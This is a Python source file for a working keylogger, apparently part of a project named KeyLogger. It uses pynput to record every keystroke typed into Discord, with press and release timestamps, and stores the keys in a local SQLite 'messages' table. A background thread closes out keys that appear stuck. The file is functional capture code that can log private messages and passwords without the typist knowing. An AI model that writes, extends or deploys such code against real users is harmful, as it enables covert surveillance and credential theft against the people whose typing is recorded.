from collections import deque

from pynput import keyboard, mouse
import psutil
import win32gui
import win32process
import time
import threading
import sqlite3

key_press_times = {}
stop_event = threading.Event()
DB_PATH = "../KeyLogger/data/Database.db"
count = 0
event_queue = deque()

# Function to log key presses with the time and key/button name
def get_active_window():
    try:
        hwnd = win32gui.GetForegroundWindow()  # Get active window handle
        _, pid = win32process.GetWindowThreadProcessId(hwnd)  # Get process ID
        process = psutil.Process(pid)  # Get process details
        return process.name()  # Return the executable name
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return "Unknown"


def on_key_press(key):
    global key_press_times
    if get_active_window() == "Discord.exe":
        try:
            button = key.char
        except AttributeError:
            button = str(key)
        press_time = time.perf_counter()
        key_press_times[button] = press_time
        event_queue.append({
            "key": button,
            "press_time": press_time,
            "release_time": None
        })

def on_key_release(key):
    global key_press_times
    if get_active_window() == "Discord.exe":
        try:
            try:
                button = key.char
            except AttributeError:
                button = str(key)
            release_time = time.perf_counter()
            for event in reversed(event_queue):
                if (event["key"] == button or event["key"] == button.upper()) and event["release_time"] is None:
                    event["release_time"] = release_time
                    break
            while event_queue and event_queue[0]["release_time"] is not None:
                e = event_queue.popleft()
                with sqlite3.connect(DB_PATH) as conn:
                    conn.execute('''
                            INSERT INTO messages (press_time, release_time, message)
                            VALUES (?, ?, ?)
                        ''', (e["press_time"], e["release_time"], e["key"]))
        except:
            pass


def cleanup_stuck_keys():
    while True:
        time.sleep(5)  # Check every 5 seconds
        now = time.perf_counter()
        for event in list(event_queue):  # shallow copy to avoid modification during iteration
            if event["release_time"] is None and (now - event["press_time"]) > 10:  # 10 sec stuck?
                event["release_time"] = 0  # short fallback duration

        # Flush any events that are now complete
        while event_queue and event_queue[0]["release_time"] is not None:
            e = event_queue.popleft()
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute('''
                    INSERT INTO messages (press_time, release_time, message)
                    VALUES (?, ?, ?)
                ''', (e["press_time"], e["release_time"], e["key"]))

# Function to log mouse clicks with the time and button
# def on_click(x, y, button, pressed):
#     if pressed:
#         program = get_active_window()
#         button_name = str(button)  # Get the button name
#         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Current time
#         global df
#         # Append new entry to the dataframe
#         # Append the new entry to the CSV without header

with sqlite3.connect(DB_PATH) as conn:
            conn.execute('''
                        CREATE TABLE IF NOT EXISTS messages (
                            press_time Int,
                            release_time Int,
                            message TEXT
                        )
                    ''')
threading.Thread(target=cleanup_stuck_keys, daemon=True).start()
# Start keyboard and mouse listeners
keyboard_listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
# mouse_listener = mouse.Listener(on_click=on_click, on_release=on_key_release)

keyboard_listener.start()
# mouse_listener.start()

keyboard_listener.join()
# mouse_listener.join()

conn = sqlite3.connect('../KeyLogger/data/Database.db')
cursor = conn.cursor()